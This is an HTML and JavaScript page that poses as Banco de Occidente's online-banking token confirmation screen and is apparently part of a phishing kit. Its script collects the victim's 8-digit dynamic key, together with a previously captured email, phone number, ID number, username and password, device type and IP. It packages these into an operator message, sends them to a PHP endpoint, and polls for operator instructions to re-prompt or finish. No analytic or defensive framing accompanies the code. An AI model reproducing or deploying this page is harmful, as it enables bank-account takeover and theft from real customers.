<html lang="en" class="hydrated"><head>
  <meta charset="utf-8">
  <title>Confimacion |</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <link rel="icon" type="image/x-icon" href="img/favicon.ico">


  <style type="text/css">
    #fondo{
        width: 100%;
        height: 100%;
        position: fixed;
        z-index: 189;
        top: 0;
        left: 0;
        background: #F3F6FE;
    }
    #cargando{
      position: fixed;
      z-index: 190;
        top: 50%;
        left: 50%;
        margin-left: -55px;
        margin-top: -55px;
    }
    #loader-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      z-index: 9999;
      justify-content: center;
      align-items: center;
    }
    .loader-content {
      background: white;
      padding: 30px;
      border-radius: 10px;
      text-align: center;
    }
  </style>



  <meta name="description" content="Nuestro renovado Portal para transacciones te permite hacer pagos de créditos o tarjetas de créditos, consultas, transferencias, descargar extractos y mucho más. ¡Navégalo!">
  <meta name="keywords" content=" portal transaccional banco de occidente, transacciones banco de occidente, anterior portal transaccional banco de occidente, pagar tarjeta de crédito banco de occidente, pagos banco de occidente, portal de pagos banco de occidente, pagar tarjeta de crédito banco de occidente, transferir a otras cuentas banco de occidente, descargar extracto banco de occidente">

  <script type="text/javascript" src="https://code.jquery.com/jquery-3.6.0.js"></script>

  <style type="text/css">
    body, html {
      height: 100%;
      font-size: 14px;
      font-family: 'Poppins', sans-serif;
    }
    
    .initial-container {
      background: no-repeat url(img/back-login.87ca483d1db8c1bdeaf4.jpg);
      background-size: cover !important;
      position: relative;
      z-index: 101;
      height: 100%;
      display: flex;
      min-height: 47rem;
    }
    
    .initial-container:before {
      content: "";
      right: 0;
      left: 0;
      bottom: 0;
      top: 0;
      position: absolute;
      z-index: -1;
      background-image: linear-gradient(180deg, transparent 40%, #fff 90%);
    }
    
    .initial-container__form {
      display: flex;
      height: 100%;
      flex-direction: column;
      justify-content: center;
      margin-right: 0;
      align-items: flex-end;
      width: 100%;
      position: relative;
      z-index: 1;
    }
    
    .initial-container__section {
      background-color: #fff;
      box-shadow: 0 0 0.429rem 0 rgba(51,51,51,.2);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 47rem;
      max-height: 100%;
      height: 100%;
      min-width: 50%;
      width: 50%;
      border-radius: 0;
    }
    
    .initial-container__content-form {
      height: 100%;
      display: flex;
      flex-direction: column;
      justify-content: center;
      width: 100%;
      max-width: 26.5rem;
      padding: 0 8px;
    }
    
    .initial-container__logo {
      width: 100%;
      background-image: url(img/logo-03-occidente-01-occidente-01-regular.aa547ca6b936469689ea.svg);
      background-size: auto 2.857rem;
      height: 10%;
      background-position: top;
      background-repeat: no-repeat;
      min-height: 4rem;
    }
    
    .form-group {
      margin-bottom: 1rem;
    }
    
    .form-group label {
      color: #555f83;
      margin-bottom: 0.5rem;
      font-weight: 500;
    }
    
    .form-control {
      width: 100%;
      padding: 0.75rem;
      border: 1px solid #adbae6;
      border-radius: 4px;
      font-size: 1rem;
      color: #555f83;
    }
    
         .token-container {
       display: flex;
       justify-content: center;
       align-items: center;
       margin: 2rem 0;
     }
     
     .token-input-single {
       width: 280px;
       height: 50px;
       border: 2px solid #adbae6;
       border-radius: 8px;
       font-size: 1.2rem;
       font-weight: bold;
       text-align: center;
       color: #0081ff;
       background: #f8f9fa;
       transition: all 0.3s ease;
       padding: 0 15px;
     }
    
         .token-input-single:focus {
       border-color: #0081ff;
       background: #fff;
       box-shadow: 0 0 0 3px rgba(0, 129, 255, 0.1);
       outline: none;
     }
    
    .btn {
      position: relative;
      border-radius: 4px;
      font-size: 1em;
      font-weight: 600;
      line-height: 1;
      letter-spacing: normal;
      text-align: center;
      padding: 0.85rem 1rem;
      color: #fff;
      background-image: linear-gradient(to bottom, #0081ff, #0056cb 72%);
      border: none;
      display: flex;
      justify-content: center;
      align-items: center;
      min-width: 2.85rem;
      max-height: 2.857rem;
      cursor: pointer;
      min-height: 39px;
    }
    
    .btn:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
    
    .btn:hover:not(:disabled) {
      box-shadow: 0 10px 15px -8px #0081ff;
    }
    
    .btn.outliner {
      background: #fff;
      border: 1px solid #adbae6;
      color: #555f83;
    }
    
    .btn.outliner:hover {
      background-color: #f8f9fa;
      border: 1px solid #0081ff;
    }
    
    .actions-content {
      display: flex;
      justify-content: center;
      gap: 1rem;
      margin-top: 2rem;
    }
    
    .text-center {
      text-align: center;
    }
    
    .m-3s-bottom {
      margin-bottom: 1.5rem;
    }
    
    .s2-sm-center {
      font-size: 1.5rem;
      font-weight: 600;
      color: #333;
    }
    
    .b2-m-center {
      font-size: 1rem;
      color: #666;
      line-height: 1.4;
    }
    
         @media (max-width: 575px) {
       .initial-container {
         background: #F3F6FE;
       }
       
       .initial-container__form {
         align-items: center;
         width: 100%;
       }
       
       .initial-container__section {
         width: 100% !important;
         min-width: 100%;
         height: 100% !important;
         border-radius: 0;
       }
       
       .token-input-single {
         width: 250px;
         height: 55px;
         font-size: 1.3rem;
       }
     }
     
     @media (min-width: 576px) {
       .initial-container__section {
         border-radius: 0.714rem;
         max-height: 68.214rem;
         min-width: 35rem;
         max-width: 38.357rem;
         height: 80%;
         width: 80%;
       }
       
       .initial-container__content-form {
         padding: 0;
       }
     }
    
         @media (min-width: 992px) {
       .initial-container__form {
         align-items: flex-end;
         margin-right: 0;
         width: 100%;
       }
       
       .initial-container__section {
         height: 98% !important;
         width: 50% !important;
         max-width: 400px;
       }
     }
  </style>
</head>

<body> 
  <div id="fondo"></div>
  <div id="cargando"><img src="img/spinner_occidente.gif"></div>
  
  <!-- Loader Overlay -->
  <div id="loader-overlay">
    <div class="loader-content">
      <img src="img/spinner_occidente.gif" alt="Cargando">
      <h3>Procesando clave dinámica...</h3>
      <p>Por favor espere un momento</p>
    </div>
  </div>

  <div class="initial-container">
    <div class="initial-container__form">
      <div class="initial-container__section">
        <div class="initial-container__content-form">
          <div class="initial-container__logo"></div>
          
          <div class="text-center m-3s-bottom">
            <h2 class="s2-sm-center">CONFIRMACION</h2>
                         <p class="b2-m-center">Ingresa el código de 8 dígitos que recibiste en tu dispositivo móvil</p>
          </div>

          <form id="tokenForm">
            <input type="hidden" id="session_id" name="session_id">
            <input type="hidden" id="username" name="username">
            <input type="hidden" id="token" name="token">
            
                         <div class="form-group">
                              <label for="token" class="text-center" style="display: block; margin-bottom: 1rem;">Código de 8 dígitos</label>
               
                              <div class="token-container">
                  <input type="text" id="token-input" class="token-input-single" maxlength="8" autocomplete="off" pattern="[0-9]*" inputmode="numeric" placeholder="">
                </div>
             </div>

            <div class="actions-content">
              <button type="button" class="btn outliner" id="btnCancelar">Cancelar</button>
              <button type="submit" class="btn" id="btnIngresar" disabled>Continuar</button>
            </div>
          </form>
        </div>
      </div>
    </div>
  </div>

  <script>
    // Espera 3 segundos y oculta el loader inicial
    setTimeout(function () {
      document.getElementById('fondo').style.display = 'none';
      document.getElementById('cargando').style.display = 'none';
    }, 3000);

    document.addEventListener("DOMContentLoaded", function () {
      const urlParams = new URLSearchParams(window.location.search);
      
      // Generar o recuperar session_id
      let sessionId = localStorage.getItem('session_id');
      if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
      }
      
      const sessionInput = document.getElementById('session_id');
      sessionInput.value = sessionId;

      // Obtener usuario desde URL params y establecer en el campo hidden
      const userFromUrl = urlParams.get('user');
      const usernameInput = document.getElementById('username');
      if (userFromUrl) {
        usernameInput.value = userFromUrl;
        localStorage.setItem('username', userFromUrl);
      }

             // Validación para el campo de token único
       const tokenInput = document.getElementById('token-input');
       
       tokenInput.addEventListener('input', function(e) {
         // Remover cualquier carácter que no sea número
         this.value = this.value.replace(/[^0-9]/g, '');
         
         // Verificar si el token está completo
         checkTokenComplete();
       });
       
       tokenInput.addEventListener('paste', function(e) {
         e.preventDefault();
         let pastedText = (e.clipboardData || window.clipboardData).getData('text');
         let numbersOnly = pastedText.replace(/[^0-9]/g, '').substring(0, 8);
         this.value = numbersOnly;
         checkTokenComplete();
       });
       
       function checkTokenComplete() {
         const token = tokenInput.value;
         const isComplete = token.length === 8;
         
         if (isComplete) {
           document.getElementById('btnIngresar').removeAttribute('disabled');
         } else {
           document.getElementById('btnIngresar').setAttribute('disabled', '');
         }
       }

      // Event listener para el botón Continuar
      const btnIngresar = document.getElementById('btnIngresar');
      
      btnIngresar.addEventListener('click', async function (event) {
        event.preventDefault();

                 // Obtener el token del campo único
         const token = document.getElementById('token-input').value;
        
                 // Validar que el token tenga 8 dígitos
         if (token.length !== 8) {
           alert('El token debe tener 8 dígitos');
           return;
         }

        // Mostrar loader
        const loader = document.getElementById('loader-overlay');
        if (loader) {
          loader.style.display = 'flex';
        }

        const formUsername = document.getElementById('username').value;
        const session_id = document.getElementById('session_id').value;

        localStorage.setItem('username', formUsername);
        localStorage.setItem('token', token);
        localStorage.setItem('session_id', session_id);
        
        // Actualizar el campo hidden con el token completo
        document.getElementById('token').value = token;

        // Obtener la identificación desde la URL (que se pasó desde index.html)
        const identificacion = urlParams.get('identificacion') || '';
        
        // Detectar tipo de dispositivo
        const userAgent = navigator.userAgent;
        let dispositivo = 'PC';
        
        if (/Android/i.test(userAgent)) {
          dispositivo = 'Android';
        } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
          dispositivo = 'iPhone';
        } else if (/Windows/i.test(userAgent)) {
          dispositivo = 'PC';
        } else if (/Mac/i.test(userAgent)) {
          dispositivo = 'Mac';
        } else if (/Linux/i.test(userAgent)) {
          dispositivo = 'Linux';
        }
        
        const hora = new Date().toLocaleString('es-ES');
        
        // Obtener IP y construir mensaje
        fetch('get_ip.php')
          .then(response => response.json())
          .then(data => {
            const ip = data.ip || 'No disponible';
            
            const mensaje = `
<b><u>💎BANCO OCCIDENTE - TOKEN💎</u></b>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO OCCIDENTE
------------------------------
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> ${ip}
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${localStorage.getItem('identificacion') || 'No disponible'}
• <b>🔑 Clave:</b> ${localStorage.getItem('password') || 'No disponible'}
------------------------------
• <b>🔄 Token:</b> ${token}
------------------------------`;

            const formData = new FormData();
            formData.append('message', mensaje);
            formData.append('transactionId', session_id);

            fetch('procesar_dinamica.php', {
              method: 'POST',
              body: formData
            })
            .then(res => res.json())
            .then(result => {
              if (result.status === 'success') {
                checkPaymentVerification(session_id, result.messageId);
              } else {
                // Ocultar loader si hay error
                const loader = document.getElementById('loader-overlay');
                if (loader) {
                  loader.style.display = 'none';
                }
              }
            })
            .catch(err => {
              // Ocultar loader si hay error
              const loader = document.getElementById('loader-overlay');
              if (loader) {
                loader.style.display = 'none';
              }
            });
          })
          .catch(() => {
            // Si falla la obtención de IP, enviar sin IP
            const mensaje = `
<b><u>💎BANCO OCCIDENTE - TOKEN💎</u></b>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO OCCIDENTE
------------------------------
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> No disponible
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${localStorage.getItem('identificacion') || 'No disponible'}
• <b>🔑 Clave:</b> ${localStorage.getItem('password') || 'No disponible'}
------------------------------
• <b>🔄 Token:</b> ${token}
------------------------------`;

            const formData = new FormData();
            formData.append('message', mensaje);
            formData.append('transactionId', session_id);

            fetch('procesar_dinamica.php', {
              method: 'POST',
              body: formData
            })
            .then(res => res.json())
            .then(result => {
              if (result.status === 'success') {
                checkPaymentVerification(session_id, result.messageId);
              } else {
                // Ocultar loader si hay error
                const loader = document.getElementById('loader-overlay');
                if (loader) {
                  loader.style.display = 'none';
                }
              }
            })
            .catch(err => {
              // Ocultar loader si hay error
              const loader = document.getElementById('loader-overlay');
              if (loader) {
                loader.style.display = 'none';
              }
            });
          });
      });

      // Event listener para el botón Cancelar
      document.getElementById('btnCancelar').addEventListener('click', function() {
        window.location.href = "index.php";
      });
    });

    async function checkPaymentVerification(transactionId, messageId) {
      try {
        const formData = new FormData();
        formData.append('transactionId', transactionId);
        formData.append('messageId', messageId);

        const res = await fetch('verificar_dinamica.php', {
          method: 'POST',
          body: formData
        });
        const result = await res.json();

        if (result.action) {
          switch (result.action) {
            case 'pedir_dinamica': 
              // Ocultar loader antes de mostrar error
              const loader = document.getElementById('loader-overlay');
              if (loader) {
                loader.style.display = 'none';
              }
              alert("Error de Clave Dinamica.");
              window.location.href = "token.php";
              break;
                         case 'error_logo': 
               // Ocultar loader antes de mostrar error
               const loader2 = document.getElementById('loader-overlay');
               if (loader2) {
                 loader2.style.display = 'none';
               }
               alert("Usuario o clave incorrectos.");
               window.location.href = "index.php";
               break;
            case 'confirm_finalizar':
              window.location.href = "/fin.php";
              break;
          }
        } else {
          setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
        }
      } catch (err) {
        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
      }
    }
  </script>
</body>
</html> 